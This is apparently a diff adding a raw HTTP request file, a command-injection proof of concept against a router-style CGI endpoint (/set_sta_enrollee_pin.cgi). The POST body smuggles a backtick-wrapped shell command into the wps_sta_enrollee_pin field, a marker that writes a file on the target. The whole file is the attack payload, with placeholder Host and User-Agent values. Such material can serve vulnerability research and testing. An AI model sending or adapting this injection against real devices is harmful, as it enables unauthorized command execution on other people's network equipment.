@@ -1,0 +1,7 @@
+POST /set_sta_enrollee_pin.cgi* HTTP/1.1
+User-Agent: ..
+Host: ../
+Content-Type: application/json
+Content-Length: 39
+
+wps_sta_enrollee_pin=`echo 222>hjr.txt`
